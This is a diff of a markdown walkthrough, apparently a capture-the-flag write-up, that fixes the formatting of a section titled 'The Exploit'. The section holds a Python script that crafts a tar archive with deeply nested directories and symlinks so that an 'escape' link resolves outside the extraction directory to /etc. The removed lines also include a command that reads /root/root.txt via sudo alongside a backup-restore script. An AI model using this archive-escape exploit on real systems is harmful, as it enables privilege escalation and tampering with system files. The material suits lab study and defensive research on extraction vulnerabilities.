@@ -1126,33 +1126,44 @@ if __name__ == "__main__":
 #### 5.2.1 The Exploit
 
 ```python
-import tarfile  
-import os  
-import io  
-import sys  
-comp = 'd' * 247  
-steps = "abcdefghijklmnop"  
-path = ""  
-with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:  
-for i in steps:  
-a = tarfile.TarInfo(os.path.join(path, comp))  
-a.type = tarfile.DIRTYPE  
-tar.addfile(a)  
-b = tarfile.TarInfo(os.path.join(path, i))  
-b.type = tarfile.SYMTYPE  
-b.linkname = comp  
-tar.addfile(b)  
-path = os.path.join(path, comp)  
-linkpath = os.path.join("/".join(steps), "l"*254)  
-l = tarfile.TarInfo(linkpath)  
-l.type = tarfile.SYMTYPE  
-l.linkname = "../" * len(steps)  
-tar.addfile(l)  
-e = tarfile.TarInfo("escape")  
-e.type = tarfile.SYMTYPE  
-e.linkname = linkpath + "/../../../../../../../etc"  
-tar.addfile(e)  
-sudo su - -c "cat /root/root.txt"backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil &&
+import tarfile
+import os
+import io
+import sys
+
+# Fixed the syntax on these variables
+comp = 'd' * 247 
+steps = "abcdefghijklmnop"
+path = ""
+
+with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
+    for i in steps:
+        # Create directory entry
+        a = tarfile.TarInfo(os.path.join(path, comp))
+        a.type = tarfile.DIRTYPE
+        tar.addfile(a)
+
+        # Create symlink entry
+        b = tarfile.TarInfo(os.path.join(path, i))
+        b.type = tarfile.SYMTYPE
+        b.linkname = comp
+        tar.addfile(b)
+
+        path = os.path.join(path, comp)
+
+    # Creating the deep link path
+    linkpath = os.path.join("/".join(steps), "l" * 254)
+    
+    l = tarfile.TarInfo(linkpath)
+    l.type = tarfile.SYMTYPE
+    l.linkname = "../" * len(steps)
+    tar.addfile(l)
+
+    # The escape symlink to target /etc or other root files
+    e = tarfile.TarInfo("escape")
+    e.type = tarfile.SYMTYPE
+    e.linkname = linkpath + "/../../../../../../../etc"
+    tar.addfile(e)
 ```
 <div align="center">
 <br>
